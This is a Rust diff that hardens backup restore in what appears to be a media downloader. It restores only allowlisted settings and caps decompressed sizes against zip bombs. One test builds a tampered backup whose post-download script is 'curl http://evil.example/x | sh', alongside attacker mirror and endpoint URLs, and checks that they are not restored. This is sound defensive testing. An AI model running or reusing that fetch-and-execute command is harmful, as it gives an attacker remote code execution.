@@ -26,12 +26,164 @@ struct Manifest {
     created_at: i64,
 }
 
+/// 备份里数据库条目解压后的大小上限。媒体库记录再多也是几十到几百 MB；2 GiB 之外基本是压缩炸弹或误选的文件，
+/// 超过就拒绝，免得写满磁盘。
+const MAX_DB_BYTES: u64 = 2 * 1024 * 1024 * 1024;
+/// 备份里用户数据（生词本、原声、术语库等）解压后的总大小上限。原声录音可能较大，给 4 GiB；单个文件另有 512 MiB 上限。
+const MAX_DATA_BYTES: u64 = 4 * 1024 * 1024 * 1024;
+const MAX_DATA_FILE_BYTES: u64 = 512 * 1024 * 1024;
+
 #[derive(Debug, Clone, Serialize)]
 #[serde(rename_all = "camelCase")]
 pub struct BackupInfo {
     pub app_version: String,
     pub created_at: i64,
     pub size: u64,
+    /// 备份里有、但出于安全不会还原的设置项（保留本机当前的值），如“下载后运行的脚本”“镜像地址”“代理”“通知渠道”。
+    pub skipped_settings: Vec<String>,
+}
+
+/// 备份里允许还原的设置：只列纯偏好类字段（开关、数字、模板、界面选项）。
+/// 凡是能指向外部地址（镜像 / 代理 / 远程解析 / 上传 / 通知 / AI 服务地址）、能执行命令（下载后脚本、规则里的动作）、
+/// 带令牌或本机路径、会改变安全设置的字段都不在这里：新增设置项默认不还原，要还原得在这里明确加上。
+const SAFE_TOP: &[&str] = &[
+    "subfolderByPlatform",
+    "filenameTemplate",
+    "concurrency",
+    "skipExisting",
+    "watchClipboard",
+    "autoDownload",
+    "notifyOnComplete",
+    "theme",
+    "closeToTray",
+    "shotAutoCopy",
+    "shotHistory",
+    "checkUpdate",
+    "autoResume",
+    "maxRetries",
+    "retryDelaySecs",
+    "keepPartOnCancel",
+    "segments",
+    "segmentMinMb",
+    "speedLimitKbps",
+    "perSiteConcurrency",
+    "batchPreview",
+    "batchFolderMin",
+    "batchJitterMin",
+    "batchJitterMax",
+    "runWindowOn",
+    "runWindow",
+    "siteRequestIntervalMs",
+    "conflictPolicy",
+    "diskReserveMb",
+    "qualityPreset",
+    "mergeContainer",
+    "audioFormat",
+    "hlsConcurrency",
+    "hlsSkipAds",
+    "seriesTemplate",
+    "useYtdlp",
+    "embedMetadata",
+    "writeInfoJson",
+    "writeNfo",
+    "openFolderOnDone",
+    "preventSleep",
+    "subscriptionsEnabled",
+    "liveMaxRecordings",
+    "liveCleanupDays",
+    "subtitleLangs",
+    "subtitleAuto",
+    "subtitleMode",
+    "subtitleConvert",
+    "danmakuAss",
+    "verifyDownloads",
+    "videoCacheMb",
+    "extDataMb",
+    "videoCacheAuto",
+    "danmaku",
+    "maxSizeMb",
+    "autoDowngrade",
+    "speedSchedule",
+    "meteredMode",
+    "language",
+    "floatBall",
+    "inbox",
+    "library",
+];
+
+/// 只还原其中一部分子字段的设置组。
+const SAFE_NESTED: &[(&str, &[&str])] = &[(
+    "ai",
+    &[
+        "supadataOn",
+        "glossaryOn",
+        "expert",
+        "expertAuto",
+        "targetLang",
+        "bilingual",
+        "batchSize",
+        "sttLanguage",
+        "autoTranslate",
+        "autoTranscribe",
+        "correctMode",
+        "correctAuto",
+        "cueLength",
+        "cueSemantic",
+        "subCleanHearing",
+        "subCleanFiller",
+        "subCleanPunct",
+        "subCleanOutput",
+    ],
+)];
+
+fn is_blank(v: &serde_json::Value) -> bool {
+    match v {
+        serde_json::Value::Null => true,
+        serde_json::Value::Bool(b) => !b,
+        serde_json::Value::Number(n) => n.as_f64() == Some(0.0),
+        serde_json::Value::String(s) => s.is_empty(),
+        serde_json::Value::Array(a) => a.is_empty(),
+        serde_json::Value::Object(o) => o.is_empty(),
+    }
+}
+
+/// 把备份里的设置按白名单合并到 `current`：白名单内的字段取备份的值，其余一律保留 `current` 的值。
+/// 返回合并结果，以及备份里带了非空值却没有还原的设置项（用来告诉用户）。
+fn merge_restorable(current: &serde_json::Value, incoming: &serde_json::Value) -> (serde_json::Value, Vec<String>) {
+    let mut merged = current.clone();
+    let mut skipped = vec![];
+    let (Some(out), Some(inc)) = (merged.as_object_mut(), incoming.as_object()) else { return (current.clone(), skipped) };
+    let cur = current.as_object();
+    for (k, v) in inc {
+        if SAFE_TOP.contains(&k.as_str()) {
+            out.insert(k.clone(), v.clone());
+        } else if let Some((_, allowed)) = SAFE_NESTED.iter().find(|(name, _)| name == k) {
+            let Some(inc_obj) = v.as_object() else { continue };
+            let cur_obj = cur.and_then(|c| c.get(k)).and_then(|c| c.as_object());
+            let mut group = cur_obj.cloned().unwrap_or_default();
+            for (nk, nv) in inc_obj {
+                if allowed.contains(&nk.as_str()) {
+                    group.insert(nk.clone(), nv.clone());
+                } else if !is_blank(nv) && cur_obj.and_then(|c| c.get(nk)) != Some(nv) {
+                    skipped.push(format!("{k}.{nk}"));
+                }
+            }
+            out.insert(k.clone(), serde_json::Value::Object(group));
+        } else if !is_blank(v) && cur.and_then(|c| c.get(k)) != Some(v) {
+            skipped.push(k.clone());
+        }
+    }
+    skipped.sort();
+    (merged, skipped)
+}
+
+/// 拷贝时最多允许 `cap` 字节，超出返回错误（不是静默截断）。返回拷贝的字节数。
+fn copy_capped(r: &mut dyn Read, w: &mut dyn Write, cap: u64) -> AppResult<u64> {
+    let n = std::io::copy(&mut r.take(cap + 1), w)?;
+    if n > cap {
+        return Err(AppError::invalid("备份文件里的内容大得不合理，已拒绝还原。"));
+    }
+    Ok(n)
 }
 
 /// 设置里不放进备份的敏感字段。
@@ -113,7 +265,9 @@ pub fn stage_import(src: &Path, data_dir: &Path) -> AppResult<BackupInfo> {
         return Err(AppError::invalid("这个备份来自不兼容的版本。"));
     }
     let settings = read_entry(&mut zip, SETTINGS_NAME, 4 * 1024 * 1024)?;
-    serde_json::from_slice::<serde_json::Value>(&settings).map_err(|_| AppError::invalid("备份里的设置已损坏。"))?;
+    let incoming = serde_json::from_slice::<serde_json::Value>(&settings).map_err(|_| AppError::invalid("备份里的设置已损坏。"))?;
+    let defaults = serde_json::to_value(crate::settings::Settings::default())?;
+    let (_, skipped_settings) = merge_restorable(&defaults, &incoming);
     let pending = data_dir.join(PENDING);
     let _ = std::fs::remove_dir_all(&pending);
     std::fs::create_dir_all(&pending)?;
@@ -122,8 +276,9 @@ pub fn stage_import(src: &Path, data_dir: &Path) -> AppResult<BackupInfo> {
         {
             let mut db_entry = zip.by_name(DB_NAME).map_err(|_| AppError::invalid("备份里没有数据库。"))?;
             let mut out = std::fs::File::create(pending.join(DB_NAME))?;
-            std::io::copy(&mut db_entry, &mut out)?;
+            copy_capped(&mut db_entry, &mut out, MAX_DB_BYTES)?;
         }
+        let mut data_budget = MAX_DATA_BYTES;
         // 用户数据（1.8 起的备份才有）：只认数据清单里登记过的名字
         let names: Vec<String> = zip.file_names().filter_map(|n| n.ok()).map(|n| n.into_owned()).collect();
         for name in names {
@@ -137,7 +292,8 @@ pub fn stage_import(src: &Path, data_dir: &Path) -> AppResult<BackupInfo> {
             }
             let mut entry = zip.by_name(&name).map_err(|e| AppError::msg(e.to_string()))?;
             let mut out = std::fs::File::create(&target)?;
-            std::io::copy(&mut (&mut entry).take(512 * 1024 * 1024), &mut out)?;
+            let n = copy_capped(&mut entry, &mut out, MAX_DATA_FILE_BYTES.min(data_budget))?;
+            data_budget -= n;
         }
         Ok(())
     })();
@@ -151,7 +307,7 @@ pub fn stage_import(src: &Path, data_dir: &Path) -> AppResult<BackupInfo> {
         let _ = std::fs::remove_dir_all(&pending);
         return Err(AppError::invalid(format!("备份里的数据库无法使用：{e}")));
     }
-    Ok(BackupInfo { app_version: m.app_version, created_at: m.created_at, size })
+    Ok(BackupInfo { app_version: m.app_version, created_at: m.created_at, size, skipped_settings })
 }
 
 /// 把备份里的用户数据放回数据目录：备份里有的才替换，原来的留一份 `.before-restore`；目录（如原声）整个换掉。
@@ -208,21 +364,18 @@ pub fn apply_pending(data_dir: &Path, settings_path: &Path) -> bool {
         std::fs::rename(&new_db, &db_path).or_else(|_| std::fs::copy(&new_db, &db_path).map(|_| ()))?;
         restore_user_data(&pending.join("data"), data_dir)?;
         if let Ok(bytes) = std::fs::read(pending.join(SETTINGS_NAME)) {
-            if let Ok(mut incoming) = serde_json::from_slice::<serde_json::Value>(&bytes) {
-                // 手机配对、临时文件目录等和本机有关的内容保留当前的
+            if let Ok(incoming) = serde_json::from_slice::<serde_json::Value>(&bytes) {
+                // 白名单还原：只取备份里明确安全的偏好，其余（脚本、镜像、代理、令牌、本机路径等）保留本机当前的值
                 let current: Option<serde_json::Value> = std::fs::read(settings_path).ok().and_then(|b| serde_json::from_slice(&b).ok());
-                if let (Some(cur), Some(inc)) = (current.as_ref().and_then(|c| c.as_object()), incoming.as_object_mut()) {
-                    for key in ["phone", "disclaimerAccepted", "downloadDir", "tempDir"] {
-                        match cur.get(key) {
-                            Some(v) => {
-                                inc.insert(key.to_string(), v.clone());
-                            }
-                            None => {
-                                inc.remove(key);
-                            }
-                        }
-                    }
+                let base = match current {
+                    Some(c) if c.is_object() => c,
+                    _ => serde_json::to_value(crate::settings::Settings::default()).unwrap_or_else(|_| serde_json::json!({})),
+                };
+                let (merged, skipped) = merge_restorable(&base, &incoming);
+                if !skipped.is_empty() {
+                    log::warn!("backup settings not restored: {}", skipped.join(", "));
                 }
+                let incoming = merged;
                 if settings_path.exists() {
                     let _ = std::fs::copy(settings_path, keep(settings_path));
                 }
@@ -348,6 +501,70 @@ mod tests {
         assert_eq!(w, "ephemeral");
         assert!(!data2.join("vault.bin").exists(), "密钥不进备份");
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn dangerous_settings_in_a_backup_are_not_restored() {
+        let dir = temp("danger");
+        let data = dir.join("data");
+        std::fs::create_dir_all(&data).unwrap();
+        let db = Db::open(&data.join(DB_NAME)).unwrap();
+        // 一份被人动过手脚的备份：带着下载后脚本、镜像、远程解析地址、AI 地址、通知渠道
+        let evil = Settings {
+            concurrency: 7,
+            post_script_enabled: true,
+            post_script: "curl http://evil.example/x | sh".into(),
+            remote_endpoint: "http://evil.example/parse".into(),
+            component_mirrors: vec!["http://evil.example/mirror".into()],
+            bt_custom_trackers: vec!["udp://evil.example:1".into()],
+            ai: crate::settings::AiSettings { base_url: "http://evil.example/v1".into(), target_lang: "ja".into(), ..Default::default() },
+            ..Default::default()
+        };
+        let zip = dir.join("evil.zip");
+        export_with(&db, &evil, "9.9.9", &zip, None).unwrap();
+        let data2 = dir.join("data2");
+        std::fs::create_dir_all(&data2).unwrap();
+        let settings_path = dir.join("cfg/settings.json");
+        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
+        let local = Settings { post_script: "".into(), remote_endpoint: "http://mine.example/".into(), ..Default::default() };
+        local.save(&settings_path).unwrap();
+        let info = stage_import(&zip, &data2).unwrap();
+        for k in ["postScript", "postScriptEnabled", "remoteEndpoint", "componentMirrors", "btCustomTrackers", "ai.baseUrl"] {
+            assert!(info.skipped_settings.iter().any(|s| s == k), "{k} 应出现在未还原列表：{:?}", info.skipped_settings);
+        }
+        assert!(!info.skipped_settings.iter().any(|s| s == "concurrency" || s == "ai.targetLang"));
+        assert!(apply_pending(&data2, &settings_path));
+        let s = Settings::load(&settings_path, Path::new("/dl"));
+        assert_eq!(s.concurrency, 7, "安全字段照常还原");
+        assert_eq!(s.ai.target_lang, "ja");
+        assert!(!s.post_script_enabled, "下载后脚本开关不还原");
+        assert_eq!(s.post_script, "", "下载后脚本不还原");
+        assert_eq!(s.remote_endpoint, "http://mine.example/", "远程地址保留本机的");
+        assert!(s.component_mirrors.is_empty() && s.bt_custom_trackers.is_empty());
+        assert_eq!(s.ai.base_url, crate::settings::AiSettings::default().base_url, "AI 服务地址保留本机的");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn merge_restorable_whitelist_and_new_fields_default_to_skipped() {
+        let cur = serde_json::json!({"concurrency": 3, "postScript": "mine", "brandNewField": "x", "ai": {"baseUrl": "http://a", "targetLang": "zh"}});
+        let inc = serde_json::json!({"concurrency": 9, "postScript": "evil", "brandNewField": "y", "network": {"proxies": [1]}, "ai": {"baseUrl": "http://evil", "targetLang": "en", "pool": [1]}});
+        let (m, skipped) = merge_restorable(&cur, &inc);
+        assert_eq!(m["concurrency"], 9);
+        assert_eq!(m["postScript"], "mine");
+        assert_eq!(m["brandNewField"], "x", "白名单之外的新字段默认不还原");
+        assert_eq!(m["ai"]["baseUrl"], "http://a");
+        assert_eq!(m["ai"]["targetLang"], "en");
+        assert!(m.get("network").is_none());
+        assert_eq!(skipped, vec!["ai.baseUrl", "ai.pool", "brandNewField", "network", "postScript"]);
+    }
+
+    #[test]
+    fn oversized_entries_are_rejected() {
+        let mut out = vec![];
+        assert_eq!(copy_capped(&mut &b"12345"[..], &mut out, 5).unwrap(), 5);
+        out.clear();
+        assert!(copy_capped(&mut &b"123456"[..], &mut out, 5).is_err());
     }
 
     #[test]
